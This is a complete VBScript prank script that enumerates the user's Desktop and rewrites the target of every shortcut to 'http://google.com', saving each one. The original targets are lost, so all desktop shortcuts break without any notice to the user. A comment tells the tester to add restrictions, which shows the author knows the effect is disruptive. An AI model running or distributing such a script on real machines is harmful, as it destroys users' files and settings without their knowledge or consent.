' Shell
Set sh = CreateObject("WScript.Shell")

' Desktop Location
deskPath = sh.SpecialFolders("Desktop")
Set desk = CreateObject("Scripting.FileSystemObject").GetFolder(deskPath)

' Look for Shortcuts and Change When Found
For Each File In desk.Files
    ' WHEN TESTING, ADD OTHER RESTRICTIONS HERE
    If File.Type = "Shortcut" Then
        Set shortcut = sh.CreateShortcut(deskPath + "\" + File.Name)
        ' Redirect
        shortcut.TargetPath = "http://google.com"
        shortcut.Save
    End If
Next

